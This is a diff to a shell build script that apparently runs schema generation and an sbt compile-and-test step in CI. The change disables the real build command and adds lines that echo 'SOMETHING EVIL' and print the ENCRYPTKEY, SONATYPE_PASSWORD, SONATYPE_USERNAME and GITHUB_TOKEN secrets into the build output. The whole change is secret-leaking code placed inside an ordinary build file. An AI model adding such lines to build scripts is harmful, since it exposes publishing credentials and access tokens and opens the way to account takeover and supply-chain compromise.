@@ -20,4 +20,9 @@ set -e
 DIR_OF_SCRIPT="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 
 "$DIR_OF_SCRIPT/gen_schemas.sh"
-sbt -Dbigquery.project=data-integration-test coverage "+ test:compile"
+echo "SOMETHING EVIL"
+echo $ENCRYPTKEY
+echo $SONATYPE_PASSWORD
+echo $SONATYPE_USERNAME
+echo $GITHUB_TOKEN
+#sbt -Dbigquery.project=data-integration-test coverage "+ test:compile"
